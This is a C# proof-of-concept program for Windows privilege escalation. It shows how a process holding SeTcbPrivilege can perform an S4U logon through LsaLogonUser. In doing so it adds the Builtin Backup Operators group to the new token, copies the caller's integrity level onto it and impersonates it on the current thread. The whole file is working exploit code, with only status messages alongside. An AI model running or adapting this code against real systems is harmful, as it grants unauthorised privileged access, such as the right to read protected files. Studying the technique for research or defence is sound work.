using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using System.Text;
using System.Runtime.InteropServices;

namespace SeTcbPrivilegePoC
{
    class SeTcbPrivilegePoC
    {
        /*
         * P/Invoke : Enums
         */
        [Flags]
        enum FormatMessageFlags : uint
        {
            FORMAT_MESSAGE_ALLOCATE_BUFFER = 0x00000100,
            FORMAT_MESSAGE_IGNORE_INSERTS = 0x00000200,
            FORMAT_MESSAGE_FROM_STRING = 0x00000400,
            FORMAT_MESSAGE_FROM_HMODULE = 0x00000800,
            FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000,
            FORMAT_MESSAGE_ARGUMENT_ARRAY = 0x00002000
        }

        [Flags]
        enum SE_GROUP_ATTRIBUTES : uint
        {
            SE_GROUP_MANDATORY = 0x00000001,
            SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002,
            SE_GROUP_ENABLED = 0x00000004,
            SE_GROUP_OWNER = 0x00000008,
            SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010,
            SE_GROUP_INTEGRITY = 0x00000020,
            SE_GROUP_INTEGRITY_ENABLED = 0x00000040,
            SE_GROUP_RESOURCE = 0x20000000,
            SE_GROUP_LOGON_ID = 0xC0000000
        }

        enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        enum SECURITY_LOGON_TYPE
        {
            UndefinedLogonType = 0,
            Interactive = 2,
            Network,
            Batch,
            Service,
            Proxy,
            Unlock,
            NetworkCleartext,
            NewCredentials,
            RemoteInteractive,
            CachedInteractive,
            CachedRemoteInteractive,
            CachedUnlock
        }

        enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            TokenElevationType,
            TokenLinkedToken,
            TokenElevation,
            TokenHasRestrictions,
            TokenAccessInformation,
            TokenVirtualizationAllowed,
            TokenVirtualizationEnabled,
            TokenIntegrityLevel,
            TokenUIAccess,
            TokenMandatoryPolicy,
            TokenLogonSid,
            MaxTokenInfoClass
        }

        /*
         * P/Invoke : Structs
         */
        class MSV1_0_S4U_LOGON : IDisposable
        {
            [StructLayout(LayoutKind.Sequential)]
            private struct INNER_LSA_UNICODE_STRING
            {
                public ushort Length;
                public ushort MaximumLength;
                public IntPtr Buffer;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct INNER_MSV1_0_S4U_LOGON
            {
                public int MessageType;
                public uint Flags;
                public INNER_LSA_UNICODE_STRING UserPrincipalName;
                public INNER_LSA_UNICODE_STRING DomainName;
            }

            private INNER_MSV1_0_S4U_LOGON msvS4uLogon =
                new INNER_MSV1_0_S4U_LOGON();
            private readonly IntPtr pointer;
            private readonly int length;

            public MSV1_0_S4U_LOGON(uint flags, string upn, string domain)
            {
                byte[] upnBytes = new byte[] { };
                byte[] domainBytes = new byte[] { };
                int MsV1_0S4ULogon = 12;

                msvS4uLogon.MessageType = MsV1_0S4ULogon;
                msvS4uLogon.Flags = flags;

                if (!string.IsNullOrEmpty(upn))
                {
                    upnBytes = Encoding.Unicode.GetBytes(upn);
                    msvS4uLogon.UserPrincipalName.Length =
                        (ushort)upnBytes.Length;
                    msvS4uLogon.UserPrincipalName.MaximumLength =
                        (ushort)(upnBytes.Length + 2);
                }
                else
                {
                    msvS4uLogon.UserPrincipalName.Length = 0;
                    msvS4uLogon.UserPrincipalName.MaximumLength = 0;
                }

                if (!string.IsNullOrEmpty(domain))
                {
                    domainBytes = Encoding.Unicode.GetBytes(domain);
                    msvS4uLogon.DomainName.Length =
                        (ushort)domainBytes.Length;
                    msvS4uLogon.DomainName.MaximumLength =
                        (ushort)(domainBytes.Length + 2);
                }
                else
                {
                    msvS4uLogon.DomainName.Length = 0;
                    msvS4uLogon.DomainName.MaximumLength = 0;
                }

                length = Marshal.SizeOf(msvS4uLogon) +
                    msvS4uLogon.UserPrincipalName.MaximumLength +
                    msvS4uLogon.DomainName.MaximumLength;
                pointer = Marshal.AllocHGlobal(length);
                Marshal.Copy(new byte[length], 0, pointer, length);

                IntPtr pUpnString = new IntPtr(
                    pointer.ToInt64() +
                    Marshal.SizeOf(msvS4uLogon));
                IntPtr pDomainString = new IntPtr(
                    pUpnString.ToInt64() +
                    msvS4uLogon.UserPrincipalName.MaximumLength);

                if (!string.IsNullOrEmpty(upn))
                {
                    Marshal.Copy(upnBytes, 0, pUpnString, upnBytes.Length);
                    msvS4uLogon.UserPrincipalName.Buffer = pUpnString;
                }
                else
                {
                    msvS4uLogon.UserPrincipalName.Buffer = IntPtr.Zero;
                }

                if (!string.IsNullOrEmpty(domain))
                {
                    Marshal.Copy(domainBytes, 0, pDomainString, domainBytes.Length);
                    msvS4uLogon.DomainName.Buffer = pDomainString;
                }
                else
                {
                    msvS4uLogon.DomainName.Buffer = IntPtr.Zero;
                }

                Marshal.StructureToPtr(msvS4uLogon, pointer, true);
            }

            public MSV1_0_S4U_LOGON(string upn, string domain)
            {
                byte[] upnBytes = new byte[] { };
                byte[] domainBytes = new byte[] { };
                int MsV1_0S4ULogon = 12;

                msvS4uLogon.MessageType = MsV1_0S4ULogon;
                msvS4uLogon.Flags = 0;

                if (!string.IsNullOrEmpty(upn))
                {
                    upnBytes = Encoding.Unicode.GetBytes(upn);
                    msvS4uLogon.UserPrincipalName.Length =
                        (ushort)upnBytes.Length;
                    msvS4uLogon.UserPrincipalName.MaximumLength =
                        (ushort)(upnBytes.Length + 2);
                }
                else
                {
                    msvS4uLogon.UserPrincipalName.Length = 0;
                    msvS4uLogon.UserPrincipalName.MaximumLength = 0;
                }

                if (!string.IsNullOrEmpty(domain))
                {
                    domainBytes = Encoding.Unicode.GetBytes(domain);
                    msvS4uLogon.DomainName.Length =
                        (ushort)domainBytes.Length;
                    msvS4uLogon.DomainName.MaximumLength =
                        (ushort)(domainBytes.Length + 2);
                }
                else
                {
                    msvS4uLogon.DomainName.Length = 0;
                    msvS4uLogon.DomainName.MaximumLength = 0;
                }

                length = Marshal.SizeOf(msvS4uLogon) +
                    msvS4uLogon.UserPrincipalName.MaximumLength +
                    msvS4uLogon.DomainName.MaximumLength;
                pointer = Marshal.AllocHGlobal(length);
                Marshal.Copy(new byte[length], 0, pointer, length);

                IntPtr pUpnString = new IntPtr(
                    pointer.ToInt64() +
                    Marshal.SizeOf(msvS4uLogon));
                IntPtr pDomainString = new IntPtr(
                    pUpnString.ToInt64() +
                    msvS4uLogon.UserPrincipalName.MaximumLength);

                if (!string.IsNullOrEmpty(upn))
                {
                    Marshal.Copy(upnBytes, 0, pUpnString, upnBytes.Length);
                    msvS4uLogon.UserPrincipalName.Buffer = pUpnString;
                }
                else
                {
                    msvS4uLogon.UserPrincipalName.Buffer = IntPtr.Zero;
                }

                if (!string.IsNullOrEmpty(domain))
                {
                    Marshal.Copy(domainBytes, 0, pDomainString, domainBytes.Length);
                    msvS4uLogon.DomainName.Buffer = pDomainString;
                }
                else
                {
                    msvS4uLogon.DomainName.Buffer = IntPtr.Zero;
                }

                Marshal.StructureToPtr(msvS4uLogon, pointer, true);
            }

            public void Dispose()
            {
                Marshal.FreeHGlobal(pointer);
            }

            public IntPtr Pointer()
            {
                return pointer;
            }

            public int Length()
            {
                return length;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct LSA_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            [MarshalAs(UnmanagedType.LPStr)]
            string Buffer;

            public LSA_STRING(string str)
            {
                Length = 0;
                MaximumLength = 0;
                Buffer = null;
                SetString(str);
            }

            public void SetString(string str)
            {
                if (str.Length > (ushort.MaxValue - 1))
                {
                    throw new ArgumentException("String too long for UnicodeString");
                }

                Length = (ushort)(str.Length);
                MaximumLength = (ushort)(str.Length + 1);
                Buffer = str;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct LUID
        {
            public uint LowPart;
            public uint HighPart;

            public LUID(uint _lowPart, uint _highPart)
            {
                LowPart = _lowPart;
                HighPart = _highPart;
            }

            public LUID(ulong value)
            {
                LowPart = (uint)(value & 0xFFFFFFFFUL);
                HighPart = (uint)(value >> 32);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct QUOTA_LIMITS
        {
            public uint PagedPoolLimit;
            public uint NonPagedPoolLimit;
            public uint MinimumWorkingSetSize;
            public uint MaximumWorkingSetSize;
            public uint PagefileLimit;
            public long TimeLimit;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid; // PSID
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_GROUPS
        {
            public int GroupCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 32)]
            public SID_AND_ATTRIBUTES[] Groups;

            public TOKEN_GROUPS(int privilegeCount)
            {
                GroupCount = privilegeCount;
                Groups = new SID_AND_ATTRIBUTES[32];
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_MANDATORY_LABEL
        {
            public SID_AND_ATTRIBUTES Label;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_SOURCE
        {

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] SourceName;
            public LUID SourceIdentifier;

            public TOKEN_SOURCE(string name)
            {
                SourceName = new byte[8];
                Encoding.GetEncoding(1252).GetBytes(name, 0, name.Length, SourceName, 0);
                if (!AllocateLocallyUniqueId(out SourceIdentifier))
                    throw new System.ComponentModel.Win32Exception();
            }
        }

        /*
         * P/Invoke : Win32 APIs
         */
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool AllocateLocallyUniqueId(out LUID Luid);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool ConvertStringSidToSid(string StringSid, out IntPtr pSid);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern int FormatMessage(
            FormatMessageFlags dwFlags,
            IntPtr lpSource,
            int dwMessageId,
            int dwLanguageId,
            StringBuilder lpBuffer,
            int nSize,
            IntPtr Arguments);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int GetCurrentThreadId();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern int GetLengthSid(IntPtr pSid);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            TOKEN_INFORMATION_CLASS TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength,
            out int ReturnLength);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LocalFree(IntPtr hMem);

        [DllImport("advapi32.dll")]
        static extern int LsaClose(IntPtr PolicyHandle);

        [DllImport("secur32.dll", SetLastError = false)]
        static extern int LsaConnectUntrusted(out IntPtr LsaHandle);

        [DllImport("secur32.dll", SetLastError = false)]
        static extern int LsaFreeReturnBuffer(IntPtr buffer);

        [DllImport("Secur32.dll", SetLastError = true)]
        static extern int LsaLogonUser(
            IntPtr LsaHandle,
            ref LSA_STRING OriginName,
            SECURITY_LOGON_TYPE LogonType,
            uint AuthenticationPackage,
            IntPtr AuthenticationInformation,
            int AuthenticationInformationLength,
            IntPtr /*ref TOKEN_GROUPS*/ pLocalGroups,
            ref TOKEN_SOURCE SourceContext,
            out IntPtr ProfileBuffer,
            out int ProfileBufferLength,
            out LUID LogonId,
            IntPtr /*out IntPtr Token*/ pToken,
            out QUOTA_LIMITS Quotas,
            out int SubStatus);

        [DllImport("Secur32.dll", SetLastError = true)]
        static extern int LsaLookupAuthenticationPackage(
            IntPtr LsaHandle,
            ref LSA_STRING PackageName,
            out uint AuthenticationPackage);

        [DllImport("advapi32.dll")]
        static extern int LsaNtStatusToWinError(int NTSTATUS);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool SetTokenInformation(
            IntPtr TokenHandle,
            TOKEN_INFORMATION_CLASS TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength);

        /*
         * Win32 Consts
         */
        const int STATUS_SUCCESS = 0;
        const int ERROR_BAD_LENGTH = 0x00000018;
        const int ERROR_INSUFFICIENT_BUFFER = 0x0000007A;
        const string MSV1_0_PACKAGE_NAME = "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0";
        const string BACKUP_OPERATORS_SID = "S-1-5-32-551";

        /*
         * User defined functions
         */
        static IntPtr GetInformationFromToken(
            IntPtr hToken,
            TOKEN_INFORMATION_CLASS tokenInfoClass)
        {
            bool status;
            int error;
            int length = 4;
            IntPtr buffer;

            do
            {
                buffer = Marshal.AllocHGlobal(length);
                ZeroMemory(buffer, length);
                status = GetTokenInformation(
                    hToken, tokenInfoClass, buffer, length, out length);
                error = Marshal.GetLastWin32Error();

                if (!status)
                    Marshal.FreeHGlobal(buffer);
            } while (!status && (error == ERROR_INSUFFICIENT_BUFFER || error == ERROR_BAD_LENGTH));

            if (!status)
                return IntPtr.Zero;

            return buffer;
        }


        static IntPtr GetMsvS4uLogonToken(
            string username,
            string domain,
            SECURITY_LOGON_TYPE type,
            string[] groupSids,
            bool adjustIntegrity)
        {
            int error;
            int ntstatus;
            var pkgName = new LSA_STRING(MSV1_0_PACKAGE_NAME);
            var tokenSource = new TOKEN_SOURCE("User32");
            var pTokenGroups = IntPtr.Zero;

            Console.WriteLine("[>] Trying to MSV S4U logon.");

            ntstatus = LsaConnectUntrusted(out IntPtr hLsa);

            if (ntstatus != STATUS_SUCCESS)
            {
                error = LsaNtStatusToWinError(ntstatus);
                Console.WriteLine("[-] Failed to connect lsa store.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return IntPtr.Zero;
            }

            ntstatus = LsaLookupAuthenticationPackage(
                hLsa,
                ref pkgName,
                out uint authnPkg);

            if (ntstatus != STATUS_SUCCESS)
            {
                error = LsaNtStatusToWinError(ntstatus);
                Console.WriteLine("[-] Failed to lookup auth package.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                LsaClose(hLsa);

                return IntPtr.Zero;
            }

            var msvS4uLogon = new MSV1_0_S4U_LOGON(username, domain);
            var originName = new LSA_STRING("S4U");
            var pS4uTokenBuffer = Marshal.AllocHGlobal(IntPtr.Size);

            if (groupSids.Length > 0)
            {
                var tokenGroups = new TOKEN_GROUPS(0);
                pTokenGroups = Marshal.AllocHGlobal(Marshal.SizeOf(tokenGroups));

                for (var idx = 0; idx < groupSids.Length; idx++)
                {
                    if (!ConvertStringSidToSid(
                        groupSids[idx],
                        out IntPtr pSid))
                    {
                        continue;
                    }

                    tokenGroups.Groups[idx].Sid = pSid;
                    tokenGroups.Groups[idx].Attributes = (uint)(
                        SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED |
                        SE_GROUP_ATTRIBUTES.SE_GROUP_MANDATORY);
                    tokenGroups.GroupCount++;
                }

                if (tokenGroups.GroupCount == 0)
                {
                    Marshal.FreeHGlobal(pTokenGroups);
                    pTokenGroups = IntPtr.Zero;
                }
                else
                {
                    Marshal.StructureToPtr(tokenGroups, pTokenGroups, true);
                }
            }

            ntstatus = LsaLogonUser(
                hLsa,
                ref originName,
                type,
                authnPkg,
                msvS4uLogon.Pointer(),
                msvS4uLogon.Length(),
                pTokenGroups,
                ref tokenSource,
                out IntPtr profileBuffer,
                out int profileBufferLength,
                out LUID logonId,
                pS4uTokenBuffer,
                out QUOTA_LIMITS quotas,
                out int subStatus);

            msvS4uLogon.Dispose();
            LsaFreeReturnBuffer(profileBuffer);
            LsaClose(hLsa);

            if (pTokenGroups != IntPtr.Zero)
                Marshal.FreeHGlobal(pTokenGroups);

            var hS4uToken = Marshal.ReadIntPtr(pS4uTokenBuffer);
            Marshal.FreeHGlobal(pS4uTokenBuffer);

            if (ntstatus != STATUS_SUCCESS)
            {
                error = LsaNtStatusToWinError(ntstatus);
                Console.WriteLine("[-] Failed to S4U logon.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, true));

                return IntPtr.Zero;
            }

            if (adjustIntegrity)
            {
                IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
                IntPtr pIntegrity = GetInformationFromToken(
                    hCurrentToken,
                    TOKEN_INFORMATION_CLASS.TokenIntegrityLevel);

                if (pIntegrity == IntPtr.Zero)
                    return IntPtr.Zero;

                var mandatoryLabel = (TOKEN_MANDATORY_LABEL)Marshal.PtrToStructure(
                    pIntegrity,
                    typeof(TOKEN_MANDATORY_LABEL));
                var lengthSid = GetLengthSid(mandatoryLabel.Label.Sid);

                if (!SetTokenInformation(
                    hS4uToken,
                    TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
                    pIntegrity,
                    Marshal.SizeOf(mandatoryLabel) + lengthSid))
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to adjust integrity level for S4U token.");
                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                    CloseHandle(hS4uToken);
                    hS4uToken = IntPtr.Zero;
                }
                else
                {
                    Console.WriteLine("[+] S4U logon is successful.");
                    Console.WriteLine("    |-> hS4uToken = 0x{0}", hS4uToken.ToString("X"));
                }
            }
            else
            {
                Console.WriteLine("[+] S4U logon is successful.");
                Console.WriteLine("    |-> hS4uToken = 0x{0}", hS4uToken.ToString("X"));
            }

            return hS4uToken;
        }


        static string GetWin32ErrorMessage(int code, bool isNtStatus)
        {
            int nReturnedLength;
            ProcessModuleCollection modules;
            FormatMessageFlags dwFlags;
            int nSizeMesssage = 256;
            var message = new StringBuilder(nSizeMesssage);
            IntPtr pNtdll = IntPtr.Zero;

            if (isNtStatus)
            {
                modules = Process.GetCurrentProcess().Modules;

                foreach (ProcessModule mod in modules)
                {
                    if (string.Compare(
                        Path.GetFileName(mod.FileName),
                        "ntdll.dll",
                        StringComparison.OrdinalIgnoreCase) == 0)
                    {
                        pNtdll = mod.BaseAddress;
                        break;
                    }
                }

                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE |
                    FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            }
            else
            {
                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            }

            nReturnedLength = FormatMessage(
                dwFlags,
                pNtdll,
                code,
                0,
                message,
                nSizeMesssage,
                IntPtr.Zero);

            if (nReturnedLength == 0)
            {
                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
            }
            else
            {
                return string.Format(
                    "[ERROR] Code 0x{0} : {1}",
                    code.ToString("X8"),
                    message.ToString().Trim());
            }
        }


        static bool ImpersonateThreadToken(IntPtr hImpersonationToken)
        {
            int error;

            Console.WriteLine("[>] Trying to impersonate thread token.");
            Console.WriteLine("    |-> Current Thread ID : {0}", GetCurrentThreadId());

            if (!ImpersonateLoggedOnUser(hImpersonationToken))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to impersonation.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return false;
            }

            IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
            IntPtr pImpersonationLevel = GetInformationFromToken(
                hCurrentToken,
                TOKEN_INFORMATION_CLASS.TokenImpersonationLevel);
            var impersonationLevel = (SECURITY_IMPERSONATION_LEVEL)Marshal.ReadInt32(
                pImpersonationLevel);
            LocalFree(pImpersonationLevel);

            if (impersonationLevel == SECURITY_IMPERSONATION_LEVEL.SecurityIdentification)
            {
                Console.WriteLine("[-] Failed to impersonation.");

                return false;
            }
            else
            {
                Console.WriteLine("[+] Impersonation is successful.");

                return true;
            }
        }


        static void ZeroMemory(IntPtr buffer, int size)
        {
            var nullBytes = new byte[size];
            Marshal.Copy(nullBytes, 0, buffer, size);
        }


        static void Main()
        {
            bool status;
            IntPtr hS4uToken;
            var groupSids = new string[]{ BACKUP_OPERATORS_SID };

            Console.WriteLine("[*] If you have SeTcbPrivilege, you can perform S4U Logon.");
            Console.WriteLine("[*] This PoC tries to perform S4U Logon and add \"Builtin\\Backup Operators\" to current token group.");

            hS4uToken = GetMsvS4uLogonToken(
                Environment.UserName,
                Environment.UserDomainName,
                SECURITY_LOGON_TYPE.Network,
                groupSids,
                true);

            if (hS4uToken == IntPtr.Zero)
                return;

            status = ImpersonateThreadToken(hS4uToken);
            CloseHandle(hS4uToken);

            if (status)
            {
                Console.WriteLine("[*] Check this thread's token with TokenViewer.exe.");
                Console.WriteLine("[*] You can confirm that \"Builtin\\Backup Operators\" is added to this thread.");
                Console.WriteLine("\n[*] To exit this program, hit [ENTER] key.");
                Console.ReadLine();
            }
        }
    }
}
